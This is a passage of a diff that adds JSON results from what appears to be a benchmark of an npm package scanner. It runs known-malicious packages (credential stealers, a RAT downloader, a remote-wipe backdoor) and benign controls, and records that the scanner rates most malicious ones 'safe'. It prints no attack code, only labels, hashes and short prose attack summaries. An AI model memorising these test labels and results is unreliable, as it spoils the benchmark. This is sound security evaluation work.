+        "sourceUrl": "https://raw.githubusercontent.com/DataDog/malicious-software-packages-dataset/72c723be547033c558244520524b117c8d71663b/samples/npm/malicious_intent/@0xengine@xmlrpc/1.3.18/2024-10-08-@0xengine_xmlrpc-v1.3.18.zip",
+        "labelEvidence": "https://zero.checkmarx.com/dozens-of-machines-infected-year-long-npm-supply-chain-attack-combines-crypto-mining-and-data-0c674ac4dcbd — Obfuscated credential theft and cryptocurrency mining; exfiltration through Dropbox and file.io.",
+        "capturedAt": "2026-11-12T09:18:57.366Z",
+        "selectionSha256": "cb59d79c42c7eb0086f84eda93b88aa453917e5dacc9b1b717d98bccee03d967",
+        "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+        "archiveKind": "repacked-source",
+        "originalArtifactSha256": "010b796380949f602f747d098f996fa1d4614588d02cec0ecd93eeea61825ea9",
+        "sourceRepositoryCommit": "72c723be547033c558244520524b117c8d71663b",
+        "sourceGitBlob": "0198850db71762a08c103f625d2d5040836ce5f1",
+        "fileHashesSha256": "f1a697f5b83c75e9607b88b7e534164500c741a8f395222480e0653b43c07f43",
+        "derivation": "Encrypted research ZIP read in memory; package source retained byte-for-byte in deterministic TAR/gzip. Every rebuilt source member verified. No original npm SRI claimed, no package code extracted/imported/executed."
+      },
+      "status": "complete",
+      "scanDurationMs": 7.04830000000004,
+      "stage": "scan",
+      "overallLevel": "safe",
+      "score": 100,
+      "highCriticalAlert": false,
+      "report": {
+        "scannerFingerprint": "9edf4bdf6b758142593e8877d2a88552865473dd113ba99d0ca7c2959cac132d",
+        "packageName": "@0xengine/xmlrpc",
+        "version": "1.3.18",
+        "overallLevel": "safe",
+        "score": 100,
+        "findings": [],
+        "contentScan": {
+          "status": "complete",
+          "archiveBytes": 18050,
+          "unpackedBytes": 56514,
+          "filesScanned": 10,
+          "filesSkipped": 4,
+          "integrityVerified": false,
+          "truncated": false
+        },
+        "scannedAt": "2026-11-12T09:20:24.046Z"
+      },
+      "wallDurationMs": 13.330400000000054
+    },
+    {
+      "id": "ethereumvulncontracthandler-1.3.0",
+      "name": "ethereumvulncontracthandler",
+      "version": "1.3.0",
+      "label": "malicious",
+      "family": "ethereum-tool-quasar-rat-2024",
+      "split": "test",
+      "mode": "metadata",
+      "provenance": {
+        "sourceUrl": "https://raw.githubusercontent.com/DataDog/malicious-software-packages-dataset/72c723be547033c558244520524b117c8d71663b/samples/npm/malicious_intent/ethereumvulncontracthandler/1.3.0/2024-12-19-ethereumvulncontracthandler-v1.3.0.zip",
+        "labelEvidence": "https://socket.dev/blog/quasar-rat-disguised-as-an-npm-package — Fake Ethereum vulnerability tool uses an obfuscated downloader to deploy Quasar RAT on Windows.",
+        "capturedAt": "2026-11-12T09:18:57.731Z",
+        "selectionSha256": "cb59d79c42c7eb0086f84eda93b88aa453917e5dacc9b1b717d98bccee03d967",
+        "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+        "archiveKind": "repacked-source",
+        "originalArtifactSha256": "c49f888fb4967e3929ed1f3b66e5d3f14cf7737d17d63b2ac856f7fb4508154c",
+        "sourceRepositoryCommit": "72c723be547033c558244520524b117c8d71663b",
+        "sourceGitBlob": "89c53830031e22b830ddc6deb4132c6181e98c63",
+        "fileHashesSha256": "8fafda8f4eaf38924db4a8f998c364b45e1f3bdbbc79980a4011bf9a30e84f44",
+        "derivation": "Encrypted research ZIP read in memory; package source retained byte-for-byte in deterministic TAR/gzip. Every rebuilt source member verified. No original npm SRI claimed, no package code extracted/imported/executed."
+      },
+      "status": "complete",
+      "scanDurationMs": 0.20680000000004384,
+      "stage": "scan",
+      "overallLevel": "safe",
+      "score": 100,
+      "highCriticalAlert": false,
+      "report": {
+        "scannerFingerprint": "9edf4bdf6b758142593e8877d2a88552865473dd113ba99d0ca7c2959cac132d",
+        "packageName": "ethereumvulncontracthandler",
+        "version": "1.3.0",
+        "overallLevel": "safe",
+        "score": 100,
+        "findings": [],
+        "scannedAt": "2026-11-12T09:20:24.050Z"
+      },
+      "wallDurationMs": 4.012399999999957
+    },
+    {
+      "id": "ethereumvulncontracthandler-1.3.0",
+      "name": "ethereumvulncontracthandler",
+      "version": "1.3.0",
+      "label": "malicious",
+      "family": "ethereum-tool-quasar-rat-2024",
+      "split": "test",
+      "mode": "deep",
+      "provenance": {
+        "sourceUrl": "https://raw.githubusercontent.com/DataDog/malicious-software-packages-dataset/72c723be547033c558244520524b117c8d71663b/samples/npm/malicious_intent/ethereumvulncontracthandler/1.3.0/2024-12-19-ethereumvulncontracthandler-v1.3.0.zip",
+        "labelEvidence": "https://socket.dev/blog/quasar-rat-disguised-as-an-npm-package — Fake Ethereum vulnerability tool uses an obfuscated downloader to deploy Quasar RAT on Windows.",
+        "capturedAt": "2026-11-12T09:18:57.731Z",
+        "selectionSha256": "cb59d79c42c7eb0086f84eda93b88aa453917e5dacc9b1b717d98bccee03d967",
+        "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+        "archiveKind": "repacked-source",
+        "originalArtifactSha256": "c49f888fb4967e3929ed1f3b66e5d3f14cf7737d17d63b2ac856f7fb4508154c",
+        "sourceRepositoryCommit": "72c723be547033c558244520524b117c8d71663b",
+        "sourceGitBlob": "89c53830031e22b830ddc6deb4132c6181e98c63",
+        "fileHashesSha256": "8fafda8f4eaf38924db4a8f998c364b45e1f3bdbbc79980a4011bf9a30e84f44",
+        "derivation": "Encrypted research ZIP read in memory; package source retained byte-for-byte in deterministic TAR/gzip. Every rebuilt source member verified. No original npm SRI claimed, no package code extracted/imported/executed."
+      },
+      "status": "complete",
+      "scanDurationMs": 3.094100000000026,
+      "stage": "scan",
+      "overallLevel": "safe",
+      "score": 100,
+      "highCriticalAlert": false,
+      "report": {
+        "scannerFingerprint": "9edf4bdf6b758142593e8877d2a88552865473dd113ba99d0ca7c2959cac132d",
+        "packageName": "ethereumvulncontracthandler",
+        "version": "1.3.0",
+        "overallLevel": "safe",
+        "score": 100,
+        "findings": [],
+        "contentScan": {
+          "status": "complete",
+          "archiveBytes": 4076,
+          "unpackedBytes": 11199,
+          "filesScanned": 2,
+          "filesSkipped": 0,
+          "integrityVerified": false,
+          "truncated": false
+        },
+        "scannedAt": "2026-11-12T09:20:24.057Z"
+      },
+      "wallDurationMs": 6.700200000000109
+    },
+    {
+      "id": "slf4j-api-js-1.0.0",
+      "name": "slf4j-api-js",
+      "version": "1.0.0",
+      "label": "malicious",
+      "family": "cross-ecosystem-impersonation-2025",
+      "split": "test",
+      "mode": "metadata",
+      "provenance": {
+        "sourceUrl": "https://raw.githubusercontent.com/DataDog/malicious-software-packages-dataset/72c723be547033c558244520524b117c8d71663b/samples/npm/malicious_intent/slf4j-api-js/1.0.0/2025-04-21-slf4j-api-js-v1.0.0.zip",
+        "labelEvidence": "https://socket.dev/blog/npm-targeted-by-malware-campaign-mimicking-familiar-library-names — Member of an obfuscated cross-ecosystem impersonation campaign involving environment theft and remote code execution.",
+        "capturedAt": "2026-11-12T09:18:58.038Z",
+        "selectionSha256": "cb59d79c42c7eb0086f84eda93b88aa453917e5dacc9b1b717d98bccee03d967",
+        "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+        "archiveKind": "repacked-source",
+        "originalArtifactSha256": "e33e55ae02a94f12e5e18da5cb682cacc2e8878df499074e6314423c03079629",
+        "sourceRepositoryCommit": "72c723be547033c558244520524b117c8d71663b",
+        "sourceGitBlob": "1459762d77928c8719c58449a41aa7894c647b53",
+        "fileHashesSha256": "e196c22c8865e567e3845654f9edd53753ed82b232de0bc4e7c037e8a3eab453",
+        "derivation": "Encrypted research ZIP read in memory; package source retained byte-for-byte in deterministic TAR/gzip. Every rebuilt source member verified. No original npm SRI claimed, no package code extracted/imported/executed."
+      },
+      "status": "complete",
+      "scanDurationMs": 0.157100000000014,
+      "stage": "scan",
+      "overallLevel": "safe",
+      "score": 92,
+      "highCriticalAlert": false,
+      "report": {
+        "scannerFingerprint": "9edf4bdf6b758142593e8877d2a88552865473dd113ba99d0ca7c2959cac132d",
+        "packageName": "slf4j-api-js",
+        "version": "1.0.0",
+        "overallLevel": "safe",
+        "score": 92,
+        "findings": [
+          {
+            "ruleId": "install-script",
+            "ruleName": "Suspicious install script",
+            "severity": "medium",
+            "message": "Lifecycle script \"postinstall\" runs automatically during package installation.",
+            "recommendation": "Inspect the script before installation and prefer packages without install-time execution.",
+            "category": "install-script"
+          }
+        ],
+        "scannedAt": "2026-11-12T09:20:24.061Z"
+      },
+      "wallDurationMs": 4.006200000000035
+    },
+    {
+      "id": "slf4j-api-js-1.0.0",
+      "name": "slf4j-api-js",
+      "version": "1.0.0",
+      "label": "malicious",
+      "family": "cross-ecosystem-impersonation-2025",
+      "split": "test",
+      "mode": "deep",
+      "provenance": {
+        "sourceUrl": "https://raw.githubusercontent.com/DataDog/malicious-software-packages-dataset/72c723be547033c558244520524b117c8d71663b/samples/npm/malicious_intent/slf4j-api-js/1.0.0/2025-04-21-slf4j-api-js-v1.0.0.zip",
+        "labelEvidence": "https://socket.dev/blog/npm-targeted-by-malware-campaign-mimicking-familiar-library-names — Member of an obfuscated cross-ecosystem impersonation campaign involving environment theft and remote code execution.",
+        "capturedAt": "2026-11-12T09:18:58.038Z",
+        "selectionSha256": "cb59d79c42c7eb0086f84eda93b88aa453917e5dacc9b1b717d98bccee03d967",
+        "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+        "archiveKind": "repacked-source",
+        "originalArtifactSha256": "e33e55ae02a94f12e5e18da5cb682cacc2e8878df499074e6314423c03079629",
+        "sourceRepositoryCommit": "72c723be547033c558244520524b117c8d71663b",
+        "sourceGitBlob": "1459762d77928c8719c58449a41aa7894c647b53",
+        "fileHashesSha256": "e196c22c8865e567e3845654f9edd53753ed82b232de0bc4e7c037e8a3eab453",
+        "derivation": "Encrypted research ZIP read in memory; package source retained byte-for-byte in deterministic TAR/gzip. Every rebuilt source member verified. No original npm SRI claimed, no package code extracted/imported/executed."
+      },
+      "status": "complete",
+      "scanDurationMs": 1.1195000000000164,
+      "stage": "scan",
+      "overallLevel": "safe",
+      "score": 84,
+      "highCriticalAlert": false,
+      "report": {
+        "scannerFingerprint": "9edf4bdf6b758142593e8877d2a88552865473dd113ba99d0ca7c2959cac132d",
+        "packageName": "slf4j-api-js",
+        "version": "1.0.0",
+        "overallLevel": "safe",
+        "score": 84,
+        "findings": [
+          {
+            "ruleId": "install-script",
+            "ruleName": "Suspicious install script",
+            "severity": "medium",
+            "message": "Lifecycle script \"postinstall\" runs automatically during package installation.",
+            "recommendation": "Inspect the script before installation and prefer packages without install-time execution.",
+            "category": "install-script"
+          },
+          {
+            "ruleId": "content-process-exec",
+            "ruleName": "Process execution capability",
+            "severity": "medium",
+            "message": "Published runtime source can execute child processes: package/src/main.js.",
+            "filePath": "package/src/main.js",
+            "lineNumber": 2,
+            "recommendation": "Confirm process execution is necessary and arguments cannot be influenced by untrusted input.",
+            "category": "suspicious-dependency"
+          }
+        ],
+        "contentScan": {
+          "status": "complete",
+          "archiveBytes": 2558,
+          "unpackedBytes": 4413,
+          "filesScanned": 3,
+          "filesSkipped": 1,
+          "integrityVerified": false,
+          "truncated": false
+        },
+        "scannedAt": "2026-11-12T09:20:24.068Z"
+      },
+      "wallDurationMs": 7.129199999999969
+    },
+    {
+      "id": "xlsx-to-json-lh-0.5.2",
+      "name": "xlsx-to-json-lh",
+      "version": "0.5.2",
+      "label": "malicious",
+      "family": "xlsx-remote-destructive-backdoor",
+      "split": "test",
+      "mode": "metadata",
+      "provenance": {
+        "sourceUrl": "https://raw.githubusercontent.com/DataDog/malicious-software-packages-dataset/72c723be547033c558244520524b117c8d71663b/samples/npm/malicious_intent/xlsx-to-json-lh/0.5.2/2025-03-30-xlsx-to-json-lh-v0.5.2.zip",
+        "labelEvidence": "https://socket.dev/blog/npm-package-wipes-codebases-with-remote-trigger — Trojanized Excel converter waits on a socket.io command channel and can recursively delete the victim project.",
+        "capturedAt": "2026-11-12T09:18:58.368Z",
+        "selectionSha256": "cb59d79c42c7eb0086f84eda93b88aa453917e5dacc9b1b717d98bccee03d967",
+        "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+        "archiveKind": "repacked-source",
+        "originalArtifactSha256": "6bf0a85ef84ed035d6ef9e91601328e4d7e2a0a7c249490110e5344052cdf8ec",
+        "sourceRepositoryCommit": "72c723be547033c558244520524b117c8d71663b",
+        "sourceGitBlob": "32cc778d2ea76659907cc4b8efc3fbf3e0847d19",
+        "fileHashesSha256": "d75748bb257537aa41c3eed8213747b9aef1e59cbc82a38ab09cfa701b35be01",
+        "derivation": "Encrypted research ZIP read in memory; package source retained byte-for-byte in deterministic TAR/gzip. Every rebuilt source member verified. No original npm SRI claimed, no package code extracted/imported/executed."
+      },
+      "status": "complete",
+      "scanDurationMs": 0.15670000000000073,
+      "stage": "scan",
+      "overallLevel": "safe",
+      "score": 82,
+      "highCriticalAlert": false,
+      "report": {
+        "scannerFingerprint": "9edf4bdf6b758142593e8877d2a88552865473dd113ba99d0ca7c2959cac132d",
+        "packageName": "xlsx-to-json-lh",
+        "version": "0.5.2",
+        "overallLevel": "safe",
+        "score": 82,
+        "findings": [
+          {
+            "ruleId": "suspicious-build-metadata",
+            "ruleName": "Suspicious build metadata",
+            "severity": "low",
+            "message": "Non-standard metadata field \"_args\" present in package.json.",
+            "recommendation": "Inspect the field; remove if injected by a build tool.",
+            "category": "informational"
+          },
+          {
+            "ruleId": "suspicious-build-metadata",
+            "ruleName": "Suspicious build metadata",
+            "severity": "low",
+            "message": "Non-standard metadata field \"_hasShrinkwrap\" present in package.json.",
+            "recommendation": "Inspect the field; remove if injected by a build tool.",
+            "category": "informational"
+          },
+          {
+            "ruleId": "suspicious-build-metadata",
+            "ruleName": "Suspicious build metadata",
+            "severity": "low",
+            "message": "Non-standard metadata field \"_installable\" present in package.json.",
+            "recommendation": "Inspect the field; remove if injected by a build tool.",
+            "category": "informational"
+          },
+          {
+            "ruleId": "suspicious-build-metadata",
+            "ruleName": "Suspicious build metadata",
+            "severity": "low",
+            "message": "Non-standard metadata field \"_shrinkwrap\" present in package.json.",
+            "recommendation": "Inspect the field; remove if injected by a build tool.",
+            "category": "informational"
+          },
+          {
+            "ruleId": "suspicious-build-metadata",
+            "ruleName": "Suspicious build metadata",
+            "severity": "low",
+            "message": "Non-standard metadata field \"_spec\" present in package.json.",
+            "recommendation": "Inspect the field; remove if injected by a build tool.",
+            "category": "informational"
+          },
+          {
+            "ruleId": "suspicious-build-metadata",
+            "ruleName": "Suspicious build metadata",
+            "severity": "low",
+            "message": "Non-standard metadata field \"_where\" present in package.json.",
+            "recommendation": "Inspect the field; remove if injected by a build tool.",
+            "category": "informational"
+          }
+        ],
+        "scannedAt": "2026-11-12T09:20:24.070Z"
+      },
+      "wallDurationMs": 2.3472000000000435
+    },
+    {
+      "id": "xlsx-to-json-lh-0.5.2",
+      "name": "xlsx-to-json-lh",
+      "version": "0.5.2",
+      "label": "malicious",
+      "family": "xlsx-remote-destructive-backdoor",
+      "split": "test",
+      "mode": "deep",
+      "provenance": {
+        "sourceUrl": "https://raw.githubusercontent.com/DataDog/malicious-software-packages-dataset/72c723be547033c558244520524b117c8d71663b/samples/npm/malicious_intent/xlsx-to-json-lh/0.5.2/2025-03-30-xlsx-to-json-lh-v0.5.2.zip",
+        "labelEvidence": "https://socket.dev/blog/npm-package-wipes-codebases-with-remote-trigger — Trojanized Excel converter waits on a socket.io command channel and can recursively delete the victim project.",
+        "capturedAt": "2026-11-12T09:18:58.368Z",
+        "selectionSha256": "cb59d79c42c7eb0086f84eda93b88aa453917e5dacc9b1b717d98bccee03d967",
+        "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+        "archiveKind": "repacked-source",
+        "originalArtifactSha256": "6bf0a85ef84ed035d6ef9e91601328e4d7e2a0a7c249490110e5344052cdf8ec",
+        "sourceRepositoryCommit": "72c723be547033c558244520524b117c8d71663b",
+        "sourceGitBlob": "32cc778d2ea76659907cc4b8efc3fbf3e0847d19",
+        "fileHashesSha256": "d75748bb257537aa41c3eed8213747b9aef1e59cbc82a38ab09cfa701b35be01",
+        "derivation": "Encrypted research ZIP read in memory; package source retained byte-for-byte in deterministic TAR/gzip. Every rebuilt source member verified. No original npm SRI claimed, no package code extracted/imported/executed."
+      },
+      "status": "complete",
+      "scanDurationMs": 0.7007999999999583,
+      "stage": "scan",
+      "overallLevel": "safe",
+      "score": 82,
+      "highCriticalAlert": false,
+      "report": {
+        "scannerFingerprint": "9edf4bdf6b758142593e8877d2a88552865473dd113ba99d0ca7c2959cac132d",
+        "packageName": "xlsx-to-json-lh",
+        "version": "0.5.2",
+        "overallLevel": "safe",
+        "score": 82,
+        "findings": [
+          {
+            "ruleId": "suspicious-build-metadata",
+            "ruleName": "Suspicious build metadata",
+            "severity": "low",
+            "message": "Non-standard metadata field \"_args\" present in package.json.",
+            "recommendation": "Inspect the field; remove if injected by a build tool.",
+            "category": "informational"
+          },
+          {
+            "ruleId": "suspicious-build-metadata",
+            "ruleName": "Suspicious build metadata",
+            "severity": "low",
+            "message": "Non-standard metadata field \"_hasShrinkwrap\" present in package.json.",
+            "recommendation": "Inspect the field; remove if injected by a build tool.",
+            "category": "informational"
+          },
+          {
+            "ruleId": "suspicious-build-metadata",
+            "ruleName": "Suspicious build metadata",
+            "severity": "low",
+            "message": "Non-standard metadata field \"_installable\" present in package.json.",
+            "recommendation": "Inspect the field; remove if injected by a build tool.",
+            "category": "informational"
+          },
+          {
+            "ruleId": "suspicious-build-metadata",
+            "ruleName": "Suspicious build metadata",
+            "severity": "low",
+            "message": "Non-standard metadata field \"_shrinkwrap\" present in package.json.",
+            "recommendation": "Inspect the field; remove if injected by a build tool.",
+            "category": "informational"
+          },
+          {
+            "ruleId": "suspicious-build-metadata",
+            "ruleName": "Suspicious build metadata",
+            "severity": "low",
+            "message": "Non-standard metadata field \"_spec\" present in package.json.",
+            "recommendation": "Inspect the field; remove if injected by a build tool.",
+            "category": "informational"
+          },
+          {
+            "ruleId": "suspicious-build-metadata",
+            "ruleName": "Suspicious build metadata",
+            "severity": "low",
+            "message": "Non-standard metadata field \"_where\" present in package.json.",
+            "recommendation": "Inspect the field; remove if injected by a build tool.",
+            "category": "informational"
+          }
+        ],
+        "contentScan": {
+          "status": "complete",
+          "archiveBytes": 2639,
+          "unpackedBytes": 6092,
+          "filesScanned": 4,
+          "filesSkipped": 2,
+          "integrityVerified": false,
+          "truncated": false
+        },
+        "scannedAt": "2026-11-12T09:20:24.076Z"
+      },
+      "wallDurationMs": 5.511899999999969
+    },
+    {
+      "id": "crypto-encrypt-ts-5.4.5",
+      "name": "crypto-encrypt-ts",
+      "version": "5.4.5",
+      "label": "malicious",
+      "family": "cryptojs-impersonation-betterstack-theft-2025",
+      "split": "test",
+      "mode": "metadata",
+      "provenance": {
+        "sourceUrl": "https://raw.githubusercontent.com/DataDog/malicious-software-packages-dataset/72c723be547033c558244520524b117c8d71663b/samples/npm/malicious_intent/crypto-encrypt-ts/5.4.5/2025-04-26-crypto-encrypt-ts-v5.4.5.zip",
+        "labelEvidence": "https://www.sonatype.com/blog/revived-cryptojs-library-is-a-crypto-stealer-in-disguise — CryptoJS impersonator retrieves wallet private keys and exfiltrates them through Better Stack, with scheduled persistence.",
+        "capturedAt": "2026-11-12T09:18:58.670Z",
+        "selectionSha256": "cb59d79c42c7eb0086f84eda93b88aa453917e5dacc9b1b717d98bccee03d967",
+        "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+        "archiveKind": "repacked-source",
+        "originalArtifactSha256": "f04e548b73594c69aae9fc110453ae7b01631978e6112cea34c16295d8978b09",
+        "sourceRepositoryCommit": "72c723be547033c558244520524b117c8d71663b",
+        "sourceGitBlob": "4dba8651b9f591eedad629f1c906db0524920ec5",
+        "fileHashesSha256": "10e0214b5fcf6cd8bb70bb6b0f44893345fce5ecf902f97ef1f7a49e34bd3b8d",
+        "derivation": "Encrypted research ZIP read in memory; package source retained byte-for-byte in deterministic TAR/gzip. Every rebuilt source member verified. No original npm SRI claimed, no package code extracted/imported/executed."
+      },
+      "status": "complete",
+      "scanDurationMs": 0.5463999999999487,
+      "stage": "scan",
+      "overallLevel": "safe",
+      "score": 92,
+      "highCriticalAlert": false,
+      "report": {
+        "scannerFingerprint": "9edf4bdf6b758142593e8877d2a88552865473dd113ba99d0ca7c2959cac132d",
+        "packageName": "crypto-encrypt-ts",
+        "version": "5.4.5",
+        "overallLevel": "safe",
+        "score": 92,
+        "findings": [
+          {
+            "ruleId": "install-script",
+            "ruleName": "Suspicious install script",
+            "severity": "medium",
+            "message": "Lifecycle script \"postinstall\" runs automatically during package installation.",
+            "recommendation": "Inspect the script before installation and prefer packages without install-time execution.",
+            "category": "install-script"
+          }
+        ],
+        "scannedAt": "2026-11-12T09:20:24.079Z"
+      },
+      "wallDurationMs": 3.497100000000046
+    },
+    {
+      "id": "crypto-encrypt-ts-5.4.5",
+      "name": "crypto-encrypt-ts",
+      "version": "5.4.5",
+      "label": "malicious",
+      "family": "cryptojs-impersonation-betterstack-theft-2025",
+      "split": "test",
+      "mode": "deep",
+      "provenance": {
+        "sourceUrl": "https://raw.githubusercontent.com/DataDog/malicious-software-packages-dataset/72c723be547033c558244520524b117c8d71663b/samples/npm/malicious_intent/crypto-encrypt-ts/5.4.5/2025-04-26-crypto-encrypt-ts-v5.4.5.zip",
+        "labelEvidence": "https://www.sonatype.com/blog/revived-cryptojs-library-is-a-crypto-stealer-in-disguise — CryptoJS impersonator retrieves wallet private keys and exfiltrates them through Better Stack, with scheduled persistence.",
+        "capturedAt": "2026-11-12T09:18:58.670Z",
+        "selectionSha256": "cb59d79c42c7eb0086f84eda93b88aa453917e5dacc9b1b717d98bccee03d967",
+        "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+        "archiveKind": "repacked-source",
+        "originalArtifactSha256": "f04e548b73594c69aae9fc110453ae7b01631978e6112cea34c16295d8978b09",
+        "sourceRepositoryCommit": "72c723be547033c558244520524b117c8d71663b",
+        "sourceGitBlob": "4dba8651b9f591eedad629f1c906db0524920ec5",
+        "fileHashesSha256": "10e0214b5fcf6cd8bb70bb6b0f44893345fce5ecf902f97ef1f7a49e34bd3b8d",
+        "derivation": "Encrypted research ZIP read in memory; package source retained byte-for-byte in deterministic TAR/gzip. Every rebuilt source member verified. No original npm SRI claimed, no package code extracted/imported/executed."
+      },
+      "status": "complete",
+      "scanDurationMs": 1.5300999999999476,
+      "stage": "scan",
+      "overallLevel": "safe",
+      "score": 84,
+      "highCriticalAlert": false,
+      "report": {
+        "scannerFingerprint": "9edf4bdf6b758142593e8877d2a88552865473dd113ba99d0ca7c2959cac132d",
+        "packageName": "crypto-encrypt-ts",
+        "version": "5.4.5",
+        "overallLevel": "safe",
+        "score": 84,
+        "findings": [
+          {
+            "ruleId": "install-script",
+            "ruleName": "Suspicious install script",
+            "severity": "medium",
+            "message": "Lifecycle script \"postinstall\" runs automatically during package installation.",
+            "recommendation": "Inspect the script before installation and prefer packages without install-time execution.",
+            "category": "install-script"
+          },
+          {
+            "ruleId": "content-process-exec",
+            "ruleName": "Process execution capability",
+            "severity": "medium",
+            "message": "Published runtime source can execute child processes: package/scripts/setup.js.",
+            "filePath": "package/scripts/setup.js",
+            "lineNumber": 1,
+            "recommendation": "Confirm process execution is necessary and arguments cannot be influenced by untrusted input.",
+            "category": "suspicious-dependency"
+          }
+        ],
+        "contentScan": {
+          "status": "complete",
+          "archiveBytes": 4019,
+          "unpackedBytes": 11923,
+          "filesScanned": 3,
+          "filesSkipped": 1,
+          "integrityVerified": false,
+          "truncated": false
+        },
+        "scannedAt": "2026-11-12T09:20:24.085Z"
+      },
+      "wallDurationMs": 6.0581999999999425
+    },
+    {
+      "id": "aws-sdk-client-s3-3.758.0",
+      "name": "@aws-sdk/client-s3",
+      "version": "3.758.0",
+      "label": "benign",
+      "family": "fresh-benign-aws-cloud-sdk",
+      "split": "test",
+      "mode": "metadata",
+      "provenance": {
+        "sourceUrl": "https://registry.npmjs.org/@aws-sdk/client-s3/-/client-s3-3.758.0.tgz",
+        "labelEvidence": "https://docs.aws.amazon.com/AWSJavaScriptSDK/v3/latest/Package/-aws-sdk-client-s3/ — Official AWS S3 client; legitimate authenticated cloud HTTP requests and credential-provider integration. Provisional benign challenge control.",
+        "capturedAt": "2026-11-12T09:18:58.994Z",
+        "selectionSha256": "68d8287f504e336f9b3a651865f29e434b516ce2f99d60b3e50cdfc9f661bcf6",
+        "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+        "archiveKind": "published-tarball",
+        "registryManifestSha256": "2628b5b8614a4379862b900ebfa3fc230d747c41dac0fc3f1abdddcfeb6e4cb8",
+        "publishedIntegrityVerified": true,
+        "derivation": "Original official npm tarball retained unchanged. package.json and README read in memory; Registry dist retained for SRI. Provisional benign control, not a safety or vulnerability-free guarantee."
+      },
+      "status": "complete",
+      "scanDurationMs": 0.9347999999999956,
+      "stage": "scan",
+      "overallLevel": "safe",
+      "score": 100,
+      "highCriticalAlert": false,
+      "report": {
+        "scannerFingerprint": "9edf4bdf6b758142593e8877d2a88552865473dd113ba99d0ca7c2959cac132d",
+        "packageName": "@aws-sdk/client-s3",
+        "version": "3.758.0",
+        "overallLevel": "safe",
+        "score": 100,
+        "findings": [],
+        "scannedAt": "2026-11-12T09:20:24.090Z"
+      },
+      "wallDurationMs": 4.782699999999977
+    },
+    {
+      "id": "aws-sdk-client-s3-3.758.0",
+      "name": "@aws-sdk/client-s3",
+      "version": "3.758.0",
+      "label": "benign",
+      "family": "fresh-benign-aws-cloud-sdk",
+      "split": "test",
+      "mode": "deep",
+      "provenance": {
+        "sourceUrl": "https://registry.npmjs.org/@aws-sdk/client-s3/-/client-s3-3.758.0.tgz",
+        "labelEvidence": "https://docs.aws.amazon.com/AWSJavaScriptSDK/v3/latest/Package/-aws-sdk-client-s3/ — Official AWS S3 client; legitimate authenticated cloud HTTP requests and credential-provider integration. Provisional benign challenge control.",
+        "capturedAt": "2026-11-12T09:18:58.994Z",
+        "selectionSha256": "68d8287f504e336f9b3a651865f29e434b516ce2f99d60b3e50cdfc9f661bcf6",
+        "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+        "archiveKind": "published-tarball",
+        "registryManifestSha256": "2628b5b8614a4379862b900ebfa3fc230d747c41dac0fc3f1abdddcfeb6e4cb8",
+        "publishedIntegrityVerified": true,
+        "derivation": "Original official npm tarball retained unchanged. package.json and README read in memory; Registry dist retained for SRI. Provisional benign control, not a safety or vulnerability-free guarantee."
+      },
+      "status": "complete",
+      "scanDurationMs": 196.1205,
+      "stage": "scan",
+      "overallLevel": "safe",
+      "score": 100,
+      "highCriticalAlert": false,
+      "report": {
+        "scannerFingerprint": "9edf4bdf6b758142593e8877d2a88552865473dd113ba99d0ca7c2959cac132d",
+        "packageName": "@aws-sdk/client-s3",
+        "version": "3.758.0",
+        "overallLevel": "safe",
+        "score": 100,
+        "findings": [],
+        "contentScan": {
+          "status": "complete",
+          "archiveBytes": 381605,
+          "unpackedBytes": 3400769,
+          "filesScanned": 396,
+          "filesSkipped": 2,
+          "integrityVerified": true,
+          "truncated": false
+        },
+        "scannedAt": "2026-11-12T09:20:24.292Z"
+      },
+      "wallDurationMs": 201.95180000000005
+    },
+    {
+      "id": "opentelemetry-sdk-node-0.57.2",
+      "name": "@opentelemetry/sdk-node",
+      "version": "0.57.2",
+      "label": "benign",
+      "family": "fresh-benign-opentelemetry-node-instrumentation",
+      "split": "test",
+      "mode": "metadata",
+      "provenance": {
+        "sourceUrl": "https://registry.npmjs.org/@opentelemetry/sdk-node/-/sdk-node-0.57.2.tgz",
+        "labelEvidence": "https://opentelemetry.io/docs/languages/js/getting-started/nodejs/ — Official Node observability SDK; legitimate instrumentation and telemetry initialization with configurable exporters. Provisional benign challenge control.",
+        "capturedAt": "2026-11-12T09:19:00.703Z",
+        "selectionSha256": "68d8287f504e336f9b3a651865f29e434b516ce2f99d60b3e50cdfc9f661bcf6",
+        "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+        "archiveKind": "published-tarball",
+        "registryManifestSha256": "17bccaa88a7c280e1589e0393f1bb0ce8d6860999b98ff833f090f4442cbaf43",
+        "publishedIntegrityVerified": true,
+        "derivation": "Original official npm tarball retained unchanged. package.json and README read in memory; Registry dist retained for SRI. Provisional benign control, not a safety or vulnerability-free guarantee."
+      },
+      "status": "complete",
+      "scanDurationMs": 0.25890000000003965,
+      "stage": "scan",
+      "overallLevel": "safe",
+      "score": 100,
+      "highCriticalAlert": false,
+      "report": {
+        "scannerFingerprint": "9edf4bdf6b758142593e8877d2a88552865473dd113ba99d0ca7c2959cac132d",
+        "packageName": "@opentelemetry/sdk-node",
+        "version": "0.57.2",
+        "overallLevel": "safe",
+        "score": 100,
+        "findings": [],
+        "scannedAt": "2026-11-12T09:20:24.298Z"
+      },
+      "wallDurationMs": 5.552899999999909
+    },
+    {
